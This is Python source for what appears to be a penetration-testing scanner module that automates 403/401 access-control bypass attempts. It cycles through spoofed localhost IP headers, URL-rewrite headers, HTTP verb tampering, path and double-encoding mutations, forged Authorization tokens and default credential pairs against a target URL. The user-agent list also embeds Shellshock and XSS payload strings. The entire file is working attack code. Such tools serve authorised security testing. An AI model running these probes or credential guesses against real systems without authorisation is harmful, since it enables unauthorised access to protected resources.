"""
bypass_scan.py  –  BypassScanMixin
===================================
Pure 403/401/405 access-control bypass.
11 phases, ~300-400 probes, fast.

Sources:
  • nomore403    (devploit)         verb tampering, case, headers, path tricks,
                                    double-encoding, HTTP versions, mid-paths
  • byp4xx       (lobuhi)           UA rotation, extensions, default credentials
Phases
------
  0  Baseline
  1  IP-Spoof Headers          (18 headers × 5 localhost variants)
  2  Rewrite / Override Headers (X-Original-URL, X-Rewrite-URL, …)
  3  Verb Tampering + Case      (20 methods + mixed-case variants)
  4  Path Mutations             (50+ URL / unicode tricks)
  5  Double / Triple Encoding   (per path segment)
  6  HTTP Version Switching     (1.0 / 1.1 / h2c)
  7  User-Agent Rotation        (14 UAs)
  8  Extension Suffix Bypass    (24 suffixes)
  9  Auth Header Forgery        (Bearer / Basic / Negotiate / NTLM)
 10  Default Credentials        (13 common pairs via Basic auth)
 11  Combo                      (best IP-header + best path stacked)
"""

from __future__ import annotations
import re, time, urllib.parse, concurrent.futures, base64
from typing import Any, Dict, List, Optional, Tuple
import requests

# ---------------------------------------------------------------------------
_LOCALHOST = [
    "127.0.0.1", "localhost", "::1", "0.0.0.0",
    "0177.0.0.1", "0x7f000001", "2130706433",
    "127.1", "127.0.1", "::ffff:127.0.0.1",
]
_IP_SPOOF_HEADERS = [
    "X-Forwarded-For","X-Real-IP","X-Originating-IP","X-Client-IP",
    "X-Remote-IP","X-Remote-Addr","X-ProxyUser-Ip","X-Original-Remote-Addr",
    "True-Client-IP","CF-Connecting-IP","Fastly-Client-IP","X-Cluster-Client-IP",
    "X-Host","X-Forwarded-Host","X-Custom-IP-Authorization","Forwarded",
    "X-Azure-ClientIP","X-Akamai-Remote-Addr",
]
_REWRITE_HEADERS = [
    ("X-Original-URL","/{path}"),("X-Rewrite-URL","/{path}"),
    ("X-Override-URL","/{path}"),("Referer","/{path}"),
    ("X-Forwarded-Prefix","/{path}"),("X-Forwarded-Path","/{path}"),
    ("X-Proxy-URL","/{path}"),("Request-Uri","/{path}"),
    ("X-Request-URI","/{path}"),
]
_VERBS = [
    "GET","POST","HEAD","OPTIONS","TRACE","PUT","DELETE","PATCH", "POSTX",
    "CONNECT","PROPFIND","PROPPATCH","MKCOL","COPY","MOVE","LOCK",
    "UNLOCK","SEARCH","PURGE","ARBITRARY",
    "get","post","head","options",
    "GeT","pOST","PoSt","GEt","gEt","dElEtE",
]
_USER_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "Googlebot-Image/1.0",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "curl/7.68.0","python-requests/2.27.1","PostmanRuntime/7.28.4",
    "() { :;}; echo Content-Type: text/html","sqlmap/1.6",
    "<script>alert(1)</script>",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Wget/1.20.3 (linux-gnu)","Java/1.8.0_292",
]
_EXTENSIONS = [
    ".json",".html",".xml",".css",".js",".php",".asp",".aspx",
    ".txt",".md",".bak",".old",".1","~",
    "%20","%09",";",";.json",".do",".action",".jsp",
    ".cfm",".rb",".py","%00",".inc",
]
_DEFAULT_CREDS = [
    ("admin","admin"),("admin","password"),("admin","123456"),
    ("root","root"),("root","toor"),("test","test"),
    ("guest","guest"),("user","user"),("admin",""),
    ("","admin"),("administrator","administrator"),
    ("admin","admin123"),("admin","letmein"),
]

# ---------------------------------------------------------------------------
def _utf8_overlong(s: str) -> str:
    m = {"/":"%c0%af",".":"%c0%ae"," ":"%c0%a0","<":"%c0%bc",">":"%c0%be"}
    return "".join(m.get(c, c) for c in s)

def _path_mutations(path: str) -> List[Dict]:
    p = path.lstrip("/"); base = "/" + p
    segs = [s for s in p.split("/") if s]
    v: List[Dict] = []
    def a(lbl, pth): v.append({"label": lbl, "path": pth})
    a("dot-segment /%2e/",    f"/%2e/{p}")
    a("trailing-dot /.",      f"{base}/.")
    a("double-slash //",      f"//{p}//")
    a("dot-slash /./",        f"/{p}/./")
    a("trailing-slash /",     f"{base}/")
    a("random-suffix .rnd",   f"{base}/.randomstring")
    a("double-dot-semi ..;/", f"{base}..;/")
    a("question-mark ?",      f"{base}?")
    a("triple-question ???",  f"{base}???")
    a("space-encode %20",     f"{base}%20/")
    a("space-wrap %20x%20",   f"/%20{p}%20/")
    for mp in ["/%2f","/.%2f","/%20","/%09","/./","/..",
               "/.;/","/..;/","//","/*","/..%2f","/..%252f",
               "/%2e/","/%2e%2e/","/%ef%bc%8f"]:
        a(f"midpath {mp}", f"{base}{mp}")
    enc1 = urllib.parse.quote(urllib.parse.quote(p))
    enc2 = urllib.parse.quote(enc1)
    a("double-encode", "/" + enc1); a("triple-encode", "/" + enc2)
    if p:
        if p.upper() != p: a("path-upper", "/" + p.upper())
        if p.lower() != p: a("path-lower", "/" + p.lower())
        mixed = "".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p))
        a("path-mixedcase", "/" + mixed)
    a("overlong-slash", "/" + p.replace("/","%c0%af"))
    fw = "".join(chr(0xFF01+ord(c)-0x21) if 0x21<=ord(c)<=0x7E else c for c in p)
    a("unicode-fullwidth", "/" + fw)
    for ep in ["/../","/./","/../.","/.%2e/","/%2e./"]:
        a(f"end-path {ep}", f"{base}{ep}")
    if segs:
        last = segs[-1]
        pre  = ("/" + "/".join(segs[:-1])) if len(segs)>1 else ""
        a("seg-dot-suffix", f"{pre}/{last}.")
        a("seg-semicolon",  f"{pre}/{last};/")
        a("seg-slash-dot",  f"{pre}/{last}/.")
        a("seg-null-byte",  f"{pre}/{last}%00")
        a("seg-hash",       f"{pre}/{last}#bypass")
        a("seg-at",         f"{pre}/{last}@{last}")
    return v

# ---------------------------------------------------------------------------
class BypassScanMixin:
    """403/401/405 access-control bypass — 11 phases, ~300 probes."""

    def scan_bypass(self) -> Dict[str, Any]:
        rd      = self.request_data
        url     = rd.get("url","")
        method  = (rd.get("method") or "GET").upper()
        hdrs    = self._bypass_build_headers(rd)
        body    = rd.get("body") or rd.get("request_body") or ""
        # Fallback: extract body from raw request_text when the body key is absent
        # (scanner_tab stores the full raw request under request_text, not body)
        if not body:
            _rt = rd.get("request_text", "")
            if _rt:
                _rt_lines = _rt.replace("\r\n", "\n").split("\n")
                _blank = next((i for i, l in enumerate(_rt_lines) if not l.strip()), -1)
                if _blank != -1 and _blank + 1 < len(_rt_lines):
                    body = "\n".join(_rt_lines[_blank + 1:]).strip()
        timeout = getattr(self,"scan_timeout",15)
        delay   = getattr(self,"scan_req_delay",0.0)
        workers = getattr(self,"scan_max_workers",6) if getattr(self,"boost_mode",False) else 1

        parsed     = urllib.parse.urlparse(url)
        origin     = f"{parsed.scheme}://{parsed.netloc}"
        path       = parsed.path or "/"
        clean_path = path.lstrip("/")
        query      = ("?" + parsed.query) if parsed.query else ""
        base_no_qs = origin + path

        findings: List[Dict] = []
        stats = {"phases_run":0,"payloads_sent":0,"bypasses_found":0}

        self.scan_progress.emit(f"🛡  [Bypass] Starting 403/401 access-control bypass — {url[:80]}")

        # Phase 0 — Baseline
        self.scan_progress.emit("🛡  [Bypass] Phase 0 — Baseline")
        b_status, b_len, b_time = self._bypass_baseline(url, method, hdrs, body, timeout)
        stats["phases_run"] += 1; stats["payloads_sent"] += 1
        self.scan_progress.emit(f"🛡  [Bypass] Baseline → HTTP {b_status}  {b_len}b  {b_time:.2f}s")
        if b_status not in (401,403,405,407,429):
            self.scan_progress.emit(f"⚠️  [Bypass] Baseline {b_status} is not a 4xx block — continuing anyway.")
        baseline = {"status":b_status,"length":b_len,"time":b_time}

        def _run(num: int, label: str, probes: List[Dict]) -> None:
            if not self.running or not probes: return
            self.scan_progress.emit(f"🛡  [Bypass] Phase {num} — {label} ({len(probes)} probes)")
            stats["phases_run"] += 1; stats["payloads_sent"] += len(probes)
            runner = (self._bypass_parallel if workers>1 else self._bypass_sequential)
            args   = (probes, baseline, b_status, timeout, delay)
            new_f  = runner(*args) if workers<=1 else runner(*args, workers)
            for f in new_f: f["phase"] = f"{num} – {label}"
            findings.extend(new_f); stats["bypasses_found"] += len(new_f)
            if new_f:
                self.scan_progress.emit(f"  ✅ [Bypass] Phase {num}: {len(new_f)} bypass(es) found!")

        # Phase 1 — IP Spoof
        p1 = []
        for h in _IP_SPOOF_HEADERS:
            for ip in _LOCALHOST[:5]:
                p1.append({"url":url,"method":method,"headers":{**hdrs,h:ip},"body":body,"technique":f"{h}: {ip}"})
        p1.append({"url":url,"method":method,"headers":{**hdrs,"Forwarded":"for=127.0.0.1;proto=http;by=127.0.0.1"},"body":body,"technique":"Forwarded: for=127.0.0.1 (RFC7239)"})
        _run(1,"IP-Spoof Headers",p1)

        # Phase 2 — Rewrite Headers
        p2 = []
        for h,tpl in _REWRITE_HEADERS:
            v = tpl.replace("{path}",clean_path)
            p2.append({"url":origin+path+query,"method":method,"headers":{**hdrs,h:v},"body":body,"technique":f"{h}: {v}"})
        p2.append({"url":origin+path+"anything"+query,"method":method,"headers":{**hdrs,"X-Original-URL":"/"+clean_path},"body":body,"technique":"path+anything + X-Original-URL"})
        _run(2,"Rewrite / Override Headers",p2)

        # Phase 3 — Verb Tampering
        p3 = []

        # Methods that carry data in the URL (no body expected)
        _GET_LIKE  = {"GET", "HEAD", "OPTIONS", "TRACE", "CONNECT", "POSTX",
                      "get", "head", "options", "trace",
                      "GeT", "pOST", "PoSt", "GEt", "gEt"}
        # Methods that carry data in the body
        _POST_LIKE = {"POST", "PUT", "PATCH"}

        import json as _json

        # ── Pre-compute body params as a query string (POST→GET conversion) ──
        _body_qs = ""
        if body.strip():
            try:
                if body.strip().startswith("{"):
                    _jd = _json.loads(body.strip())
                    _body_qs = urllib.parse.urlencode(
                        {k: (v if isinstance(v, str) else _json.dumps(v))
                         for k, v in _jd.items()})
                else:
                    _bq = urllib.parse.parse_qs(body.strip(), keep_blank_values=True)
                    _body_qs = urllib.parse.urlencode(
                        {k: v[0] for k, v in _bq.items()})
            except Exception:
                _body_qs = ""

        # ── Pre-compute URL query params as a body string (GET→POST conversion) ──
        _url_qs   = urllib.parse.urlparse(url).query   # already percent-encoded
        _url_base = url.split("?")[0]                  # URL without query string

        for verb in _VERBS:
            if verb.upper() == method and verb == method:
                continue
            verb_upper = verb.upper()

            # POST/PUT/PATCH → GET-like: move body params into URL query string
            if (method.upper() in _POST_LIKE
                    and verb_upper in {"GET", "HEAD", "OPTIONS", "TRACE"}
                    and _body_qs):
                existing_q = urllib.parse.urlparse(url).query
                new_q      = (existing_q + "&" + _body_qs) if existing_q else _body_qs
                new_url    = url.split("?")[0] + "?" + new_q
                # Drop Content-Type — no body is sent
                new_hdrs = {k: v for k, v in hdrs.items()
                            if k.lower() != "content-type"}
                p3.append({"url": new_url, "method": verb, "headers": new_hdrs,
                           "body": "", "technique": f"Verb: {verb} (body→query params)"})

            # GET-like → POST/PUT/PATCH: move URL query params into body
            elif (method.upper() not in _POST_LIKE
                      and verb_upper in _POST_LIKE
                      and _url_qs):
                # Variant 1 — with Content-Type: application/x-www-form-urlencoded
                hdrs_ct = {**hdrs, "Content-Type": "application/x-www-form-urlencoded"}
                p3.append({"url": _url_base, "method": verb, "headers": hdrs_ct,
                           "body": _url_qs,
                           "technique": f"Verb: {verb} (query→body, with CT)"})
                # Variant 2 — without Content-Type header
                hdrs_no_ct = {k: v for k, v in hdrs.items()
                              if k.lower() != "content-type"}
                p3.append({"url": _url_base, "method": verb, "headers": hdrs_no_ct,
                           "body": _url_qs,
                           "technique": f"Verb: {verb} (query→body, no CT)"})

            else:
                # All other verb switches — keep body/URL as-is
                p3.append({"url": url, "method": verb, "headers": hdrs,
                           "body": body, "technique": f"Verb: {verb}"})

        _run(3,"Verb Tampering + Case Switching",p3)

        # Phase 4 — Path Mutations
        _run(4,"Path Mutations (50+ variants)",
             [{"url":origin+m["path"]+query,"method":method,"headers":hdrs,"body":body,"technique":m["label"]}
              for m in _path_mutations(path)])

        # Phase 5 — Double Encoding
        p5 = []
        segs = [s for s in path.split("/") if s]
        for i,seg in enumerate(segs):
            for ev,lbl in [(urllib.parse.quote(seg,safe=""),"single-enc"),
                           (urllib.parse.quote(urllib.parse.quote(seg,safe=""),safe=""),"double-enc")]:
                np = "/"+"/".join(segs[:i]+[ev]+segs[i+1:])
                p5.append({"url":origin+np+query,"method":method,"headers":hdrs,"body":body,"technique":f"{lbl} seg[{i}]={seg}"})
        if not p5:
            p5.append({"url":origin+"%2F"+query,"method":method,"headers":hdrs,"body":body,"technique":"encode-root-slash"})
        _run(5,"Double / Triple URL Encoding",p5)

        # Phase 6 — HTTP Version
        _run(6,"HTTP Version Switching",[
            {"url":url,"method":method,"headers":{**hdrs,"X-HTTP-Version-Override":"HTTP/1.0"},"body":body,"technique":"HTTP/1.0 header override"},
            {"url":url,"method":method,"headers":{**hdrs,"Connection":"close"},"body":body,"technique":"Connection: close"},
            {"url":url,"method":method,"headers":{**hdrs,"Upgrade":"h2c"},"body":body,"technique":"Upgrade: h2c"},
        ])

        # Phase 7 — User-Agent
        _run(7,"User-Agent Rotation",
             [{"url":url,"method":method,"headers":{**hdrs,"User-Agent":ua},"body":body,"technique":f"UA: {ua[:60]}"}
              for ua in _USER_AGENTS])

        # Phase 8 — Extensions
        _run(8,"Extension Suffix Bypass",
             [{"url":base_no_qs+ext+(query or ""),"method":method,"headers":hdrs,"body":body,"technique":f"ext: {ext}"}
              for ext in _EXTENSIONS])

        # Phase 9 — Auth Forgery
        _run(9,"Auth Header Forgery",
             [{"url":url,"method":method,"headers":{**hdrs,hn:hv},"body":body,"technique":f"{hn}: {hv[:50]}"}
              for hn,hv in [
                ("Authorization","Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.LwimMJA3puF360uW4jZoKL-Ll8YMVTFIs2M7oIIFbhs"),
                ("Authorization","Basic "+base64.b64encode(b"admin:admin").decode()),
                ("Authorization","Basic "+base64.b64encode(b"admin:").decode()),
                ("Authorization","Negotiate"),("Authorization","NTLM"),
                ("X-Auth-Token","0"),("X-API-Key","undefined"),
                ("X-API-Key","null"),("X-API-Key","admin"),
                ("Authorization","Bearer null"),("Authorization","Bearer 0"),
              ]])

        # Phase 10 — Default Creds
        _run(10,"Default Credentials",
             [{"url":url,"method":method,
               "headers":{**hdrs,"Authorization":"Basic "+base64.b64encode(f"{u}:{p}".encode()).decode()},
               "body":body,"technique":f"cred {u}:{p}"}
              for u,p in _DEFAULT_CREDS])

        # Phase 11 — Combo
        ch = {**hdrs,"X-Forwarded-For":"127.0.0.1","X-Original-URL":"/"+clean_path,
              "X-Custom-IP-Authorization":"127.0.0.1","X-Real-IP":"127.0.0.1"}
        _run(11,"Combo (IP-header + path stacked)",
             [{"url":origin+mp+query,"method":method,"headers":ch,"body":body,"technique":lbl}
              for lbl,mp in [
                ("combo /%2e/path",  f"/%2e/{clean_path}"),
                ("combo //path//",   f"//{clean_path}//"),
                ("combo /path/",     f"{path}/"),
                ("combo path..;/",   f"{path}..;/"),
                ("combo path%00",    f"{path}%00"),
              ]])

        # Deduplicate & sort
        seen: set = set(); deduped = []
        for f in findings:
            k=(f.get("status_code"),f.get("length"))
            if k not in seen: seen.add(k); deduped.append(f)
        findings = deduped
        findings.sort(key=lambda f:{"HIGH":0,"MEDIUM":1,"LOW":2}.get(f.get("confidence","LOW"),9))

        is_vuln = len(findings) > 0
        summary = (f"{'⚠️ BYPASS FOUND' if is_vuln else '✓ No bypass found'}  |  "
                   f"Phases: {stats['phases_run']}  |  Sent: {stats['payloads_sent']}  |  "
                   f"Bypasses: {len(findings)}")
        self.scan_progress.emit(f"🛡  [Bypass] Done — {summary}")
        return {"vulnerable":is_vuln,"summary":summary,"stats":stats,"baseline":baseline,"findings":findings}

    # ------------------------------------------------------------------
    def _bypass_build_headers(self, rd: Dict) -> Dict[str, str]:
        hdrs: Dict[str,str] = {}
        for line in rd.get("request_text","").split("\n")[1:]:
            s = line.rstrip("\r\n")
            if not s: break
            if ":" in s:
                k,v = s.split(":",1)
                if k.strip().lower() not in ("content-length","transfer-encoding"):
                    hdrs[k.strip()] = v.strip()
        for k,v in (rd.get("headers") or {}).items():
            if k.lower() not in ("content-length","transfer-encoding"):
                hdrs[k] = v
        return hdrs

    def _bypass_baseline(self, url, method, headers, body, timeout):
        try:
            start = time.time()
            resp  = self.send_request_with_traffic(url, headers, method=method, body=body,
                        payload="[Bypass-Baseline]", payload_type="Bypass-Baseline", allow_redirects=False)
            elapsed = round(time.time()-start,3)
            return resp.status_code, len(resp.content or b""), elapsed
        except Exception as e:
            self.scan_progress.emit(f"⚠️  [Bypass] Baseline error: {e}")
            return 403, 0, 0.0

    def _bypass_probe(self, probe: Dict, b_status: int, b_len: int, timeout: int) -> Optional[Dict]:
        if not self.running: return None
        url,method = probe["url"], probe.get("method","GET")
        hdrs,body  = probe.get("headers",{}), probe.get("body","")
        tech       = probe.get("technique","")
        try:
            start = time.time()
            resp  = self.send_request_with_traffic(url, hdrs, method=method, body=body,
                        payload=tech[:80], payload_type="Bypass", allow_redirects=False)
            elapsed = round(time.time()-start,3)
            sc,length = resp.status_code, len(resp.content or b"")
            delta = length - b_len
        except Exception: return None
        is_bypass, confidence, evidence = False, "LOW", ""
        if 200 <= sc <= 299:
            is_bypass, confidence = True, "HIGH"
            evidence = f"HTTP {sc} — access granted (baseline was {b_status})"
        elif sc == 302:
            loc = resp.headers.get("Location", "")
            if loc and "login" not in loc.lower() and "error" not in loc.lower():
                is_bypass, confidence = True, "MEDIUM"
                evidence = f"HTTP 302 redirect → {loc[:60]}"
        if not is_bypass: return None
        return {"technique":tech,"url":url,"method":method,"headers_added":hdrs,
                "status_code":sc,"length":length,"delta_len":delta,
                "response_time":elapsed,"confidence":confidence,"evidence":evidence}

    def _bypass_sequential(self, probes, baseline, b_status, timeout, delay) -> List[Dict]:
        results = []; bl = baseline.get("length",0)
        for p in probes:
            if not self.running: break
            if delay>0: time.sleep(delay)
            f = self._bypass_probe(p, b_status, bl, timeout)
            if f: results.append(f)
        return results

    def _bypass_parallel(self, probes, baseline, b_status, timeout, delay, workers) -> List[Dict]:
        results = []; bl = baseline.get("length",0)
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as exe:
            futs = {exe.submit(self._bypass_probe, p, b_status, bl, timeout): p for p in probes}
            for fut in concurrent.futures.as_completed(futs):
                if not self.running: break
                try:
                    f = fut.result()
                    if f: results.append(f)
                except Exception: pass
        return results